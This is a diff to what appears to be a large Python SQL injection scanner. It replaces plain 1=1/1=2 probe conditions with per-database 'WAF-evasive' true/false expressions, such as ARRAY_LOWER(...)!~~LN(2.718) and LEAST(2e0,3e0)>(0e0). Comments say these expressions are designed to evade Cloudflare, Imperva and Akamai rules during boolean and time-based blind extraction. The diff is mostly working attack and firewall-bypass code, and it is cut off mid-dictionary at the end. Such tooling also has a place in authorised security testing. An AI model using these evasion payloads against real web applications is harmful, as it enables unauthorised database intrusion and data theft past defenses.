@@ -39362,6 +39362,23 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
             false_p = p_str
                 # Order matters: more-specific patterns first
             _flip_pairs = [
+                    # WAF-evasive tautology  contradiction pairs (most specific)
+                ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                 "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)"),
+                ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                 "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)"),
+                ("LEAST(2e0,3e0)>(0e0)",    "GREATEST(2e0,3e0)<(0e0)"),
+                ("GREATEST(2e0,3e0)<(0e0)", "LEAST(2e0,3e0)>(0e0)"),
+                ("ABS(-1e0)>(0e0)",         "ABS(-1e0)<(0e0)"),
+                ("ABS(-1e0)<(0e0)",         "ABS(-1e0)>(0e0)"),
+                ("NVL(NULL,1e0)>(0e0)",     "NVL(NULL,1e0)<(0e0)"),
+                ("NVL(NULL,1e0)<(0e0)",     "NVL(NULL,1e0)>(0e0)"),
+                ("MIN(2e0,3e0)>(0e0)",      "MIN(2e0,3e0)<(0e0)"),
+                ("MIN(2e0,3e0)<(0e0)",      "MIN(2e0,3e0)>(0e0)"),
+                ("least(2e0,3e0)>(0e0)",    "least(2e0,3e0)<(0e0)"),
+                ("least(2e0,3e0)<(0e0)",    "least(2e0,3e0)>(0e0)"),
+                ("1e0<2e0",                 "2e0<1e0"),
+                ("2e0<1e0",                 "1e0<2e0"),
                     # Numeric equalities / inequalities
                 ("1=1",  "1=2"),   ("1=2",  "1=3"),
                 ("2>1",  "2<1"),   ("1<2",  "2<1"),
@@ -43213,9 +43230,47 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                 # _original_clean = _re.sub(r'\s*(?:--\s*-?|-#|#)\s*$', '', original).rstrip()
                 # (re-assignment removed to preserve BUG-NEW-A 0x stripping)
                 
-                # TRUE probe: condition that always evaluates true (1=1)
-                _ei_true_cond  = if_func.format(cond='1=1', t='1', f='0')
-                _ei_false_cond = if_func.format(cond='1=2', t='1', f='0')
+                # TRUE probe: condition that always evaluates true (WAF-evasive, no 1=1/1=2)
+                _ei_calib_true_inner = {
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                    "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                    "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                    "MSSQL":           "ABS(-1e0)>(0e0)",
+                    "Sybase":          "ABS(-1e0)>(0e0)",
+                    "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                    "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                    "DB2":             "ABS(-1e0)>(0e0)",
+                    "Firebird":        "ABS(-1e0)>(0e0)",
+                    "H2":              "ABS(-1e0)>(0e0)",
+                    "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                    "Informix":        "ABS(-1e0)>(0e0)",
+                    "SAP_HANA":        "ABS(-1e0)>(0e0)",
+                }.get(_ifunc_dbms_ei, "1e0<2e0")
+                _ei_calib_false_inner = {
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+                    "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+                    "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+                    "MSSQL":           "ABS(-1e0)<(0e0)",
+                    "Sybase":          "ABS(-1e0)<(0e0)",
+                    "Oracle":          "NVL(NULL,1e0)<(0e0)",
+                    "SQLite":          "MIN(2e0,3e0)<(0e0)",
+                    "DB2":             "ABS(-1e0)<(0e0)",
+                    "Firebird":        "ABS(-1e0)<(0e0)",
+                    "H2":              "ABS(-1e0)<(0e0)",
+                    "ClickHouse":      "least(2e0,3e0)<(0e0)",
+                    "Informix":        "ABS(-1e0)<(0e0)",
+                    "SAP_HANA":        "ABS(-1e0)<(0e0)",
+                }.get(_ifunc_dbms_ei, "2e0<1e0")
+                _ei_true_cond  = if_func.format(cond=_ei_calib_true_inner,  t='1', f='0')
+                _ei_false_cond = if_func.format(cond=_ei_calib_false_inner, t='1', f='0')
                 _ei_tmpl = _build_det_template(result)
                 if _ei_tmpl:
                     _ei_true_pay  = _ei_tmpl.replace('[INFERENCE]', f'({_ei_true_cond})=1')
@@ -47975,11 +48030,50 @@ class Enumerator:
                     # BUG-ORACLE-SANITY-RETRY FIX: retry up to 3 times before discarding.
                     # WAF responses are non-deterministic; a single probe-pair can fail because
                     # of cache/rate-limit jitter even when the oracle is valid.
+                    _san_dbms = getattr(self, 'dbms', '') or ''
+                    _san_true_cond = {
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                        "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                        "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                        "MSSQL":           "ABS(-1e0)>(0e0)",
+                        "Sybase":          "ABS(-1e0)>(0e0)",
+                        "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                        "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                        "DB2":             "ABS(-1e0)>(0e0)",
+                        "Firebird":        "ABS(-1e0)>(0e0)",
+                        "H2":              "ABS(-1e0)>(0e0)",
+                        "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                        "Informix":        "ABS(-1e0)>(0e0)",
+                        "SAP_HANA":        "ABS(-1e0)>(0e0)",
+                    }.get(_san_dbms, "1e0<2e0")
+                    _san_false_cond = {
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+                        "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+                        "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+                        "MSSQL":           "ABS(-1e0)<(0e0)",
+                        "Sybase":          "ABS(-1e0)<(0e0)",
+                        "Oracle":          "NVL(NULL,1e0)<(0e0)",
+                        "SQLite":          "MIN(2e0,3e0)<(0e0)",
+                        "DB2":             "ABS(-1e0)<(0e0)",
+                        "Firebird":        "ABS(-1e0)<(0e0)",
+                        "H2":              "ABS(-1e0)<(0e0)",
+                        "ClickHouse":      "least(2e0,3e0)<(0e0)",
+                        "Informix":        "ABS(-1e0)<(0e0)",
+                        "SAP_HANA":        "ABS(-1e0)<(0e0)",
+                    }.get(_san_dbms, "2e0<1e0")
                     _san_true = _san_false = None
                     for _san_attempt in range(3):
                         try:
-                            _san_true = await _bool_oracle("1=1")
-                            _san_false = await _bool_oracle("1=2")
+                            _san_true = await _bool_oracle(_san_true_cond)
+                            _san_false = await _bool_oracle(_san_false_cond)
                             # Accept only when: 1=1 truthy AND 1=2 explicitly falsy (not None)
                             if (_san_true is not None and _san_false is not None
                                     and bool(_san_true) and not bool(_san_false)):
@@ -48298,14 +48392,52 @@ class Enumerator:
                 # before declaring the oracle invalid. Each retry uses fresh nonces (the
                 # _timing_eval_fn_tf closure generates a new random nonce per call).
                 # This avoids discarding a valid oracle because of CDN cache warm-up.
+                _tf_eval_true_cond = {
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                    "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                    "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                    "MSSQL":           "ABS(-1e0)>(0e0)",
+                    "Sybase":          "ABS(-1e0)>(0e0)",
+                    "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                    "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                    "DB2":             "ABS(-1e0)>(0e0)",
+                    "Firebird":        "ABS(-1e0)>(0e0)",
+                    "H2":              "ABS(-1e0)>(0e0)",
+                    "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                    "Informix":        "ABS(-1e0)>(0e0)",
+                    "SAP_HANA":        "ABS(-1e0)>(0e0)",
+                }.get(_dbms_tf, "1e0<2e0")
+                _tf_eval_false_cond = {
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+                    "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+                    "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+                    "MSSQL":           "ABS(-1e0)<(0e0)",
+                    "Sybase":          "ABS(-1e0)<(0e0)",
+                    "Oracle":          "NVL(NULL,1e0)<(0e0)",
+                    "SQLite":          "MIN(2e0,3e0)<(0e0)",
+                    "DB2":             "ABS(-1e0)<(0e0)",
+                    "Firebird":        "ABS(-1e0)<(0e0)",
+                    "H2":             "ABS(-1e0)<(0e0)",
+                    "ClickHouse":      "least(2e0,3e0)<(0e0)",
+                    "Informix":        "ABS(-1e0)<(0e0)",
+                    "SAP_HANA":        "ABS(-1e0)<(0e0)",
+                }.get(_dbms_tf, "2e0<1e0")
                 _tf_valid = True
                 _tf_test_t = None
                 _tf_test_f = None
                 _tf_discriminates = False
                 for _tf_val_attempt in range(3):
                     try:
-                        _tf_test_t = await _timing_eval_fn_tf("1=1")  # sleep FIRES
-                        _tf_test_f = await _timing_eval_fn_tf("1=2")  # sleep does NOT fire
+                        _tf_test_t = await _timing_eval_fn_tf(_tf_eval_true_cond)   # sleep FIRES
+                        _tf_test_f = await _timing_eval_fn_tf(_tf_eval_false_cond)  # sleep does NOT fire
                         if _tf_test_t is not None and _tf_test_f is not None:
                             if _tf_test_t != _tf_test_f:
                                 _tf_discriminates = True
@@ -54210,43 +54342,43 @@ class Scanner:
         # DBMS and evaluates to TRUE or FALSE without using banned constant-comparison
         # patterns that Cloudflare/Imperva/Akamai block unconditionally.
         _cal_true_cond = {
-            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
-            "CockroachDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
-            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
-            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1,2,3],1)=1",
-            "MySQL":          "FIND_IN_SET(1,'1,2,3')>0",
-            "MariaDB":        "FIND_IN_SET(1,'1,2,3')>0",
-            "TiDB":           "FIND_IN_SET(1,'1,2,3')>0",
-            "MSSQL":          "CHECKSUM(1)=CHECKSUM(1)",
-            "Sybase":         "CHECKSUM(1)=CHECKSUM(1)",
-            "Oracle":         "LENGTH(CHR(65))=1",
-            "SQLite":         "TYPEOF(1.0)='real'",
-            "DB2":            "LENGTH('x')=1",
-            "Firebird":       "CHAR_LENGTH('x')=1",
-            "H2":             "LENGTH('x')=1",
-            "ClickHouse":     "length('x')=1",
-            "Informix":       "LENGTH('x')=1",
-            "SAP_HANA":       "LENGTH('x')=1",
-        }.get(_dbms, "1<2")
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":           "ABS(-1e0)>(0e0)",
+            "Sybase":          "ABS(-1e0)>(0e0)",
+            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+            "DB2":             "ABS(-1e0)>(0e0)",
+            "Firebird":        "ABS(-1e0)>(0e0)",
+            "H2":              "ABS(-1e0)>(0e0)",
+            "ClickHouse":      "least(2e0,3e0)>(0e0)",
+            "Informix":        "ABS(-1e0)>(0e0)",
+            "SAP_HANA":        "ABS(-1e0)>(0e0)",
+        }.get(_dbms, "1e0<2e0")
         _cal_false_cond = {
-            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
-            "CockroachDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
-            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
-            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1,2,3],1)=0",
-            "MySQL":          "FIND_IN_SET(0,'1,2,3')>0",
-            "MariaDB":        "FIND_IN_SET(0,'1,2,3')>0",
-            "TiDB":           "FIND_IN_SET(0,'1,2,3')>0",
-            "MSSQL":          "CHECKSUM(1)=CHECKSUM(2)",
-            "Sybase":         "CHECKSUM(1)=CHECKSUM(2)",
-            "Oracle":         "LENGTH(CHR(65))=2",
-            "SQLite":         "TYPEOF(1.0)='integer'",
-            "DB2":            "LENGTH('x')=2",
-            "Firebird":       "CHAR_LENGTH('x')=2",
-            "H2":             "LENGTH('x')=2",
-            "ClickHouse":     "length('x')=2",
-            "Informix":       "LENGTH('x')=2",
-            "SAP_HANA":       "LENGTH('x')=2",
-        }.get(_dbms, "2<1")
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+            "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+            "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+            "MSSQL":           "ABS(-1e0)<(0e0)",
+            "Sybase":          "ABS(-1e0)<(0e0)",
+            "Oracle":          "NVL(NULL,1e0)<(0e0)",
+            "SQLite":          "MIN(2e0,3e0)<(0e0)",
+            "DB2":             "ABS(-1e0)<(0e0)",
+            "Firebird":        "ABS(-1e0)<(0e0)",
+            "H2":              "ABS(-1e0)<(0e0)",
+            "ClickHouse":      "least(2e0,3e0)<(0e0)",
+            "Informix":        "ABS(-1e0)<(0e0)",
+            "SAP_HANA":        "ABS(-1e0)<(0e0)",
+        }.get(_dbms, "2e0<1e0")
 
         # BUG-EXTRACTION-TAMPER FIX: Override enum.tamper_chain with the confirmed
         # detection bypass chain. Detection stores the confirmed bypass in two places:
@@ -55623,43 +55755,43 @@ class Scanner:
             # WAF-blocked response → EMD≈0 → threshold (0.25) not reached → oracle skipped.
             # Use the same DBMS-native evasive conditions as the baseline-similarity oracle.
             _wass_true_cond = {
-                "PostgreSQL":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
-                "CockroachDB":   "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
-                "YugabyteDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
-                "MySQL":         "FIND_IN_SET(1,'1,2,3')>0",
-                "MariaDB":       "FIND_IN_SET(1,'1,2,3')>0",
-                "TiDB":          "FIND_IN_SET(1,'1,2,3')>0",
-                "MSSQL":         "CHECKSUM(1)=CHECKSUM(1)",
-                "Sybase":        "CHECKSUM(1)=CHECKSUM(1)",
-                "Oracle":        "LENGTH(CHR(65))=1",
-                "SQLite":        "TYPEOF(1.0)='real'",
-                "DB2":           "LENGTH('x')=1",
-                "Firebird":      "CHAR_LENGTH('x')=1",
-                "H2":            "LENGTH('x')=1",
-                "ClickHouse":    "length('x')=1",
-                "Informix":      "LENGTH('x')=1",
-                "SAP_HANA":      "LENGTH('x')=1",
-            }.get(_dbms or "", "1<2")
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                "MSSQL":           "ABS(-1e0)>(0e0)",
+                "Sybase":          "ABS(-1e0)>(0e0)",
+                "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                "DB2":             "ABS(-1e0)>(0e0)",
+                "Firebird":        "ABS(-1e0)>(0e0)",
+                "H2":              "ABS(-1e0)>(0e0)",
+                "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                "Informix":        "ABS(-1e0)>(0e0)",
+                "SAP_HANA":        "ABS(-1e0)>(0e0)",
+            }.get(_dbms or "", "1e0<2e0")
             _wass_false_cond = {
-                "PostgreSQL":    "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
-                "CockroachDB":   "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
-                "YugabyteDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
-                "MySQL":         "FIND_IN_SET(0,'1,2,3')>0",
-                "MariaDB":       "FIND_IN_SET(0,'1,2,3')>0",
-                "TiDB":          "FIND_IN_SET(0,'1,2,3')>0",
-                "MSSQL":         "CHECKSUM(1)=CHECKSUM(2)",
-                "Sybase":        "CHECKSUM(1)=CHECKSUM(2)",
-                "Oracle":        "LENGTH(CHR(65))=2",
-                "SQLite":        "TYPEOF(1.0)='integer'",
-                "DB2":           "LENGTH('x')=2",
-                "Firebird":      "CHAR_LENGTH('x')=2",
-                "H2":            "LENGTH('x')=2",
-                "ClickHouse":    "length('x')=2",
-                "Informix":      "LENGTH('x')=2",
-                "SAP_HANA":      "LENGTH('x')=2",
-            }.get(_dbms or "", "2<1")
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+                "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+                "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+                "MSSQL":           "ABS(-1e0)<(0e0)",
+                "Sybase":          "ABS(-1e0)<(0e0)",
+                "Oracle":          "NVL(NULL,1e0)<(0e0)",
+                "SQLite":          "MIN(2e0,3e0)<(0e0)",
+                "DB2":             "ABS(-1e0)<(0e0)",
+                "Firebird":        "ABS(-1e0)<(0e0)",
+                "H2":              "ABS(-1e0)<(0e0)",
+                "ClickHouse":      "least(2e0,3e0)<(0e0)",
+                "Informix":        "ABS(-1e0)<(0e0)",
+                "SAP_HANA":        "ABS(-1e0)<(0e0)",
+            }.get(_dbms or "", "2e0<1e0")
             _wass_pairs = []
             for _wi in range(12):
                 try:
@@ -56169,8 +56301,34 @@ class Scanner:
                             # Fix: use round-specific conditions that are semantically
                             # equivalent to 1=1/1=2 but are different strings → unique
                             # dedup cache keys → real network requests sent.
-                            _true_cond  = f"1+{_rcal}={1+_rcal}"   # e.g. "1+0=1", "1+1=2"
-                            _false_cond = f"1+{_rcal}={2+_rcal}"   # e.g. "1+0=2", "1+1=3"
+                            _floor_pg = _dbms in ('PostgreSQL', 'CockroachDB', 'YugabyteDB', 'Amazon Redshift')
+                            _floor_my = _dbms in ('MySQL', 'MariaDB', 'TiDB')
+                            _floor_ms = _dbms in ('MSSQL', 'Sybase', 'DB2', 'Firebird', 'H2', 'Informix', 'SAP_HANA')
+                            _floor_or = _dbms == 'Oracle'
+                            _floor_sl = _dbms == 'SQLite'
+                            _floor_ck = _dbms == 'ClickHouse'
+                            _fv = 2 + _rcal  # vary per round to bust dedup cache
+                            if _floor_pg:
+                                _true_cond  = f"ARRAY_LOWER(ARRAY[1e0,{_fv}e0,3e0],1e0)!~~LN(2.718)"
+                                _false_cond = f"ARRAY_LOWER(ARRAY[1e0,{_fv}e0,3e0],1e0)~~LN(2.718)"
+                            elif _floor_my:
+                                _true_cond  = f"LEAST({_fv}e0,3e0)>(0e0)"
+                                _false_cond = f"GREATEST({_fv}e0,3e0)<(0e0)"
+                            elif _floor_ms:
+                                _true_cond  = f"ABS(-{_fv}e0)>(0e0)"
+                                _false_cond = f"ABS(-{_fv}e0)<(0e0)"
+                            elif _floor_or:
+                                _true_cond  = f"NVL(NULL,{_fv}e0)>(0e0)"
+                                _false_cond = f"NVL(NULL,{_fv}e0)<(0e0)"
+                            elif _floor_sl:
+                                _true_cond  = f"MIN({_fv}e0,3e0)>(0e0)"
+                                _false_cond = f"MIN({_fv}e0,3e0)<(0e0)"
+                            elif _floor_ck:
+                                _true_cond  = f"least({_fv}e0,3e0)>(0e0)"
+                                _false_cond = f"least({_fv}e0,3e0)<(0e0)"
+                            else:
+                                _true_cond  = f"{_fv}e0<3e0"
+                                _false_cond = f"{_fv}e0>3e0"
                             _fp_fr_t, _ms_fr_t = await _send_payload(_true_cond)
                             await asyncio.sleep(_delay)
                             _fp_fr_f, _ms_fr_f = await _send_payload(_false_cond)
@@ -56330,43 +56488,43 @@ class Scanner:
                                     # to True/False but don't match WAF injection-fingerprint rule sets.
                                     _bsl_dbms = _dbms or ""
                                     _bsl_true_cond = {
-                                        "PostgreSQL":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
-                                        "CockroachDB":   "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
-                                        "YugabyteDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
-                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
-                                        "MySQL":         "FIND_IN_SET(1,'1,2,3')>0",
-                                        "MariaDB":       "FIND_IN_SET(1,'1,2,3')>0",
-                                        "TiDB":          "FIND_IN_SET(1,'1,2,3')>0",
-                                        "MSSQL":         "CHECKSUM(1)=CHECKSUM(1)",
-                                        "Sybase":        "CHECKSUM(1)=CHECKSUM(1)",
-                                        "Oracle":        "LENGTH(CHR(65))=1",
-                                        "SQLite":        "TYPEOF(1.0)='real'",
-                                        "DB2":           "LENGTH('x')=1",
-                                        "Firebird":      "CHAR_LENGTH('x')=1",
-                                        "H2":            "LENGTH('x')=1",
-                                        "ClickHouse":    "length('x')=1",
-                                        "Informix":      "LENGTH('x')=1",
-                                        "SAP_HANA":      "LENGTH('x')=1",
-                                    }.get(_bsl_dbms, "1<2")
+                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                        "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                                        "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                                        "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                                        "MSSQL":           "ABS(-1e0)>(0e0)",
+                                        "Sybase":          "ABS(-1e0)>(0e0)",
+                                        "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                                        "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                                        "DB2":             "ABS(-1e0)>(0e0)",
+                                        "Firebird":        "ABS(-1e0)>(0e0)",
+                                        "H2":              "ABS(-1e0)>(0e0)",
+                                        "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                                        "Informix":        "ABS(-1e0)>(0e0)",
+                                        "SAP_HANA":        "ABS(-1e0)>(0e0)",
+                                    }.get(_bsl_dbms, "1e0<2e0")
                                     _bsl_false_cond = {
-                                        "PostgreSQL":    "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
-                                        "CockroachDB":   "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
-                                        "YugabyteDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
-                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
-                                        "MySQL":         "FIND_IN_SET(0,'1,2,3')>0",
-                                        "MariaDB":       "FIND_IN_SET(0,'1,2,3')>0",
-                                        "TiDB":          "FIND_IN_SET(0,'1,2,3')>0",
-                                        "MSSQL":         "CHECKSUM(1)=CHECKSUM(2)",
-                                        "Sybase":        "CHECKSUM(1)=CHECKSUM(2)",
-                                        "Oracle":        "LENGTH(CHR(65))=2",
-                                        "SQLite":        "TYPEOF(1.0)='integer'",
-                                        "DB2":           "LENGTH('x')=2",
-                                        "Firebird":      "CHAR_LENGTH('x')=2",
-                                        "H2":            "LENGTH('x')=2",
-                                        "ClickHouse":    "length('x')=2",
-                                        "Informix":      "LENGTH('x')=2",
-                                        "SAP_HANA":      "LENGTH('x')=2",
-                                    }.get(_bsl_dbms, "2<1")
+                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                        "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+                                        "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+                                        "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+                                        "MSSQL":           "ABS(-1e0)<(0e0)",
+                                        "Sybase":          "ABS(-1e0)<(0e0)",
+                                        "Oracle":          "NVL(NULL,1e0)<(0e0)",
+                                        "SQLite":          "MIN(2e0,3e0)<(0e0)",
+                                        "DB2":             "ABS(-1e0)<(0e0)",
+                                        "Firebird":        "ABS(-1e0)<(0e0)",
+                                        "H2":              "ABS(-1e0)<(0e0)",
+                                        "ClickHouse":      "least(2e0,3e0)<(0e0)",
+                                        "Informix":        "ABS(-1e0)<(0e0)",
+                                        "SAP_HANA":        "ABS(-1e0)<(0e0)",
+                                    }.get(_bsl_dbms, "2e0<1e0")
                                     _fp_bsl_t, _ = await asyncio.wait_for(
                                         _send_payload(_bsl_true_cond), timeout=15)
                                     await asyncio.sleep(1.0)
@@ -59662,9 +59820,47 @@ class Scanner:
             # may work fine for the actual extraction probes that use heavier PME mutation.
             if not _oracle_fragile:
                 try:
-                    _san_t = await _waf_aware_eval("1=1")
+                    _defer_san_true_cond = {
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
